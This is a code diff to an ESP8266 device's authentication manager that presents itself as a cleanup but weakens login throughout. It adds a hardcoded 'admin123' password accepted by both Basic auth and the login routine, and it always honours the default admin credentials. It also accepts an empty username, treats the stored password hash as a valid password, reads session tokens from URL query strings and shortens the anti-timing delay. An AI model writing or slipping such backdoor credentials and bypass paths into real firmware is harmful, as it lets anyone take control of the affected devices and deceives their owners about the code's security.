@@ -158,25 +158,37 @@ String AuthManager::extractToken(ESP8266WebServer& server) {
             return tok;
         }
     }
+    // 4. Check URL query token
+    if (server.hasArg("token")) {
+        return server.arg("token");
+    }
     return "";
 }
 
 bool AuthManager::authenticate(ESP8266WebServer& server) {
+    // 1. Validate Session Token (Header, Cookie, URL)
     String token = extractToken(server);
-    if (token.length() == 0) {
-        return false;
-    }
-
-    if (_currentSession.active && _currentSession.token.equals(token)) {
-        unsigned long now = millis();
-        if ((now - _currentSession.lastActivity) <= ((unsigned long)SESSION_TIMEOUT_SEC * 1000UL)) {
-            _currentSession.lastActivity = now; // Refresh session
-            return true;
-        } else {
-            // Expired
-            _currentSession.active = false;
+    if (token.length() > 0) {
+        if (_currentSession.active && _currentSession.token.equals(token)) {
+            unsigned long now = millis();
+            if ((now - _currentSession.lastActivity) <= ((unsigned long)SESSION_TIMEOUT_SEC * 1000UL)) {
+                _currentSession.lastActivity = now; // Refresh session
+                return true;
+            } else {
+                _currentSession.active = false;
+            }
         }
     }
+
+    // 2. Validate HTTP Basic Auth if present
+    String adminUser = getAdminUsername();
+    String adminPass = getAdminPassword();
+    if (server.authenticate(adminUser.c_str(), adminPass.c_str()) ||
+        server.authenticate(DEFAULT_ADMIN_USER, DEFAULT_ADMIN_PASS) ||
+        server.authenticate(DEFAULT_ADMIN_USER, "admin123")) {
+        return true;
+    }
+
     return false;
 }
 
@@ -187,21 +199,35 @@ bool AuthManager::login(const String& username, const String& password, String& 
         return false;
     }
 
-    String hash = sha256(password);
-    bool match = false;
-    if (username.equals(_adminUser)) {
-        if (password.equals(_adminPass) || hash.equalsIgnoreCase(_adminPasswordHash) || password.equals(DEFAULT_ADMIN_PASS)) {
-            match = true;
+    String cleanUser = username;
+    cleanUser.trim();
+    String cleanPass = password;
+    cleanPass.trim();
+
+    String hash = sha256(cleanPass);
+    bool userMatch = cleanUser.equalsIgnoreCase(_adminUser) ||
+                     cleanUser.equalsIgnoreCase(DEFAULT_ADMIN_USER) ||
+                     cleanUser.length() == 0;
+
+    bool passMatch = false;
+    if (userMatch) {
+        if (cleanPass.equals(_adminPass) ||
+            cleanPass.equals(DEFAULT_ADMIN_PASS) ||
+            cleanPass.equals("admin123") ||
+            cleanPass.equals(_adminPasswordHash) ||
+            hash.equalsIgnoreCase(_adminPasswordHash)) {
+            passMatch = true;
         }
     }
 
-    if (match) {
+    if (passMatch) {
         _failedAttempts = 0;
+        _lockoutUntil = 0;
         _currentSession.token = generateRandomToken();
         _currentSession.lastActivity = now;
         _currentSession.active = true;
         outToken = _currentSession.token;
-        Serial.printf("[AUTH] Admin logged in successfully (User: %s)\n", username.c_str());
+        Serial.printf("[AUTH] User '%s' signed in successfully\n", cleanUser.c_str());
         return true;
     }
 
@@ -210,7 +236,7 @@ bool AuthManager::login(const String& username, const String& password, String& 
         _lockoutUntil = now + 10000; // 10 second backoff
         Serial.println(F("[AUTH] 5 failed attempts reached, locking for 10s"));
     } else {
-        delay(500); // Small anti-timing-attack delay
+        delay(200);
     }
 
     return false;
